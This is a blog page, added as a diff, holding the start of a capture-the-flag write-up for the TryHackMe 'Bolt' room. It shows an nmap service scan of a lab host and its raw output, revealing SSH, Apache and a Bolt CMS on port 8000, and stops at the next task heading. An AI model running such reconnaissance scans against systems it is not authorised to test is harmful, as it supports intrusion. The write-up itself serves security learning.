@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Tzero86@trojanwave/posts/bolt_writeup/</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <meta name="googlebot" content="index,follow,snippet,archive">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
+    
+      <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+      <![endif]-->
+       <meta property="og:title" content="Bolt_writeup.sh" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tzero86bits.tk/posts/bolt_writeup/" /><meta property="article:published_time" content="2020-08-26T21:34:28-04:00" />
+
+
+
+<meta name="twitter:title" content="Bolt_writeup.sh"/>
+<meta name="twitter:description" content="Bolt - THM Room This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thingy for Bolt TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)
+Enjoy!
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all."/>
+
+</head>
+<body class="terminal">
+    <div class="container">
+        <div class="terminal-nav">
+          <header class="terminal-logo">
+            <div class="logo terminal-prompt">
+              
+              
+              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
+              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/bolt_writeup'>bolt_writeup</a>/</div></header>
+          <nav class="terminal-menu">
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
+                
+            </ul>
+          </nav>
+        </div>
+    </div>
+
+    <div class="container animated zoomIn fast" >
+        
+<h1>Bolt_writeup.sh</h1>
+Aug. 26, 2020
+
+
+<br/><br/>
+<img src="../img/bolt_cover.gif" alt="Post Cover Gif animation";>
+<br/><br/>
+<h1 id="bolt---thm-room">Bolt - THM Room</h1>
+<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thingy for Bolt TryhackMe&rsquo;s room. This is a pretty raw writeup detailing all my process to root this room, flaws and all. You have been warned :)</p>
+<p>Enjoy!</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/bolt">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
+</ul>
+<h2 id="task-1-what-port-number-has-a-web-server-with-a-cms-running">[Task 1] What port number has a web server with a CMS running?</h2>
+<p>Let&rsquo;s fire up an <strong>nmap</strong> scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bolt<span style="color:#f92672">]</span>
+└─$ nmap -A -sC -sV -T4 10.10.105.96
+
+</code></pre></div><p>While nmap runs let&rsquo;s take a look at the IP on the browser to see if there is any page being served. We get the default apache page:</p>
+<p><img src="https://i.imgur.com/zVMGPMS.png" alt="Apache2 Ubuntu default page"></p>
+<p>and if we try to navigate to any other URL we can get the specific version:</p>
+<p><img src="https://i.imgur.com/o5N22Ss.png" alt="Apache2 version"></p>
+<p>Let&rsquo;s check nmap results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bolt<span style="color:#f92672">]</span>
+└─$ nmap -A -sC -sV -T4 10.10.105.96
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-26 20:22 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.105.96
+Host is up <span style="color:#f92672">(</span>0.38s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">997</span> closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp   open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+8***/tcp open  http    <span style="color:#f92672">(</span>PHP 7.2.32-1<span style="color:#f92672">)</span>
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 <span style="color:#ae81ff">404</span> Not Found
+|     Date: Thu, <span style="color:#ae81ff">27</span> Aug <span style="color:#ae81ff">2020</span> 00:23:45 GMT
+|     Connection: close
+|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
+|     Cache-Control: private, must-revalidate
+|     Date: Thu, <span style="color:#ae81ff">27</span> Aug <span style="color:#ae81ff">2020</span> 00:23:45 GMT
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+|     pragma: no-cache
+|     expires: -1
+|     X-Debug-Token: 0531cf
+|     &lt;!doctype html&gt;
+|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+|     &lt;head&gt;
+|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;
+|     &lt;link href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700&#34;</span> rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span>&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/theme/base-2018/css/bulma.css?8ca0842ebb&#34;</span>&gt;
+|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/theme/base-2018/css/theme.css?6cb66bfe9f&#34;</span>&gt;
+|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;generator&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Bolt&#34;</span>&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#main-content&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vis
+</span><span style="color:#e6db74">|   GetRequest: 
+</span><span style="color:#e6db74">|     HTTP/1.0 200 OK
+</span><span style="color:#e6db74">|     Date: Thu, 27 Aug 2020 00:23:44 GMT
+</span><span style="color:#e6db74">|     Connection: close
+</span><span style="color:#e6db74">|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1
+</span><span style="color:#e6db74">|     Cache-Control: public, s-maxage=600
+</span><span style="color:#e6db74">|     Date: Thu, 27 Aug 2020 00:23:44 GMT
+</span><span style="color:#e6db74">|     Content-Type: text/html; charset=UTF-8
+</span><span style="color:#e6db74">|     X-Debug-Token: e716a7
+</span><span style="color:#e6db74">|     &lt;!doctype html&gt;
+</span><span style="color:#e6db74">|     &lt;html lang=&#34;</span>en-GB<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;head&gt;
+</span><span style="color:#e6db74">|     &lt;meta charset=&#34;</span>utf-8<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>viewport<span style="color:#e6db74">&#34; content=&#34;</span>width<span style="color:#f92672">=</span>device-width, initial-scale<span style="color:#f92672">=</span>1.0<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;title&gt;Bolt | A hero is unleashed&lt;/title&gt;
+</span><span style="color:#e6db74">|     &lt;link href=&#34;</span>https://fonts.googleapis.com/css?family<span style="color:#f92672">=</span>Bitter|Roboto:400,400i,700<span style="color:#e6db74">&#34; rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/theme/base-2018/css/bulma.css?8ca0842ebb<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>stylesheet<span style="color:#e6db74">&#34; href=&#34;</span>/theme/base-2018/css/theme.css?6cb66bfe9f<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;meta name=&#34;</span>generator<span style="color:#e6db74">&#34; content=&#34;</span>Bolt<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;link rel=&#34;</span>canonical<span style="color:#e6db74">&#34; href=&#34;</span>http://0.0.0.0:8000/<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|     &lt;/head&gt;
+</span><span style="color:#e6db74">|_    &lt;body class=&#34;</span>front<span style="color:#e6db74">&#34;&gt;
+</span><span style="color:#e6db74">|_http-generator: Bolt
+</span><span style="color:#e6db74">|_http-title: Bolt | A hero is unleashed
+</span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span><span style="color:#e6db74">SF-Port8000-TCP:V=7.80%I=7%D=8/26%Time=5F46FCF0%P=x86_64-pc-linux-gnu%r(Ge
+</span><span style="color:#e6db74">SF:tRequest,1EFB,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\x</span>20OK<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:2020<span style="color:#ae81ff">\x</span>2000:23:44<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>X-Powered-By:<span style="color:#ae81ff">\x</span>20PHP
+SF:/7<span style="color:#ae81ff">\.</span>2<span style="color:#ae81ff">\.</span>32-1<span style="color:#ae81ff">\+</span>ubuntu18<span style="color:#ae81ff">\.</span>04<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\+</span>deb<span style="color:#ae81ff">\.</span>sury<span style="color:#ae81ff">\.</span>org<span style="color:#ae81ff">\+</span>1<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20pu
+SF:blic,<span style="color:#ae81ff">\x</span>20s-maxage<span style="color:#f92672">=</span>600<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:23:44
+SF:<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>X-Debug-Toke
+SF:n:<span style="color:#ae81ff">\x</span>20e716a7<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en-GB<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>u
+SF:tf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">20</span>
+SF:content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Bolt<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\|\x</span>20A
+SF:<span style="color:#ae81ff">\x</span>20hero<span style="color:#ae81ff">\x</span>20is<span style="color:#ae81ff">\x</span>20unleashed&lt;/title&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;l
+SF:ink<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>https://fonts<span style="color:#ae81ff">\.</span>googleapis<span style="color:#ae81ff">\.</span>com/css<span style="color:#ae81ff">\?</span>family<span style="color:#f92672">=</span>Bitter<span style="color:#ae81ff">\|</span>Roboto
+SF::400,400i,700<span style="color:#ae81ff">\&#34;\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/bulma<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:?8ca0842ebb<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>styleshe
+SF:et<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/theme<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>6cb66bfe9f<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>generator<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Bolt<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>canonical<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>http://0<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\.</span>0:8000/<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:n<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;/head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;body<span style="color:#ae81ff">\x</span>20class<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>front<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>
+SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;a<span style="color:#ae81ff">\x</span>20<span style="color:#e6db74">&#34;)%r(FourOhFourRequest,152B,&#34;</span>HTTP/1
+SF:<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\x</span>20404<span style="color:#ae81ff">\x</span>20Not<span style="color:#ae81ff">\x</span>20Found<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:
+SF:23:45<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>X-Powered-By:<span style="color:#ae81ff">\x</span>20PHP/7<span style="color:#ae81ff">\.</span>2<span style="color:#ae81ff">\.</span>32-1
+SF:<span style="color:#ae81ff">\+</span>ubuntu18<span style="color:#ae81ff">\.</span>04<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\+</span>deb<span style="color:#ae81ff">\.</span>sury<span style="color:#ae81ff">\.</span>org<span style="color:#ae81ff">\+</span>1<span style="color:#ae81ff">\r\n</span>Cache-Control:<span style="color:#ae81ff">\x</span>20private,<span style="color:#ae81ff">\x</span>20m
+SF:ust-revalidate<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Thu,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202020<span style="color:#ae81ff">\x</span>2000:23:45<span style="color:#ae81ff">\x</span>20GMT
+SF:<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/html;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>UTF-8<span style="color:#ae81ff">\r\n</span>pragma:<span style="color:#ae81ff">\x</span>20no-cache
+SF:<span style="color:#ae81ff">\r\n</span>expires:<span style="color:#ae81ff">\x</span>20-1<span style="color:#ae81ff">\r\n</span>X-Debug-Token:<span style="color:#ae81ff">\x</span>200531cf<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html
+SF:&gt;<span style="color:#ae81ff">\n</span>&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;meta<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>utf-8<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial
+SF:-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
+SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Bolt<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\|\x</span>20A<span style="color:#ae81ff">\x</span>20hero<span style="color:#ae81ff">\x</span>20is<span style="color:#ae81ff">\x</span>20unleashed&lt;/title&gt;<span style="color:#ae81ff">\n\x</span><span style="color:#ae81ff">2</span>
+SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>https://fonts<span style="color:#ae81ff">\.</span>googleapis<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>SF:.com/css<span style="color:#ae81ff">\?</span>family<span style="color:#f92672">=</span>Bitter<span style="color:#ae81ff">\|</span>Roboto:400,400i,700<span style="color:#ae81ff">\&#34;\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>
+SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/
+SF:theme/base-2018/css/bulma<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>8ca0842ebb<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/them
+SF:e<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>6cb66bfe9f<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>generator<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">2</span>
+SF:0content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Bolt<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;/head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;body&gt;<span style="color:#ae81ff">\n\x</span>
+SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;a<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#main-content\&#34;\x20class=\&#34;v</span>
+SF:is<span style="color:#e6db74">&#34;);
+</span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds
+</span></code></pre></div><h2 id="task-2-what-is-the-username-we-can-find-in-the-cms">[Task 2] What is the username we can find in the CMS?</h2>
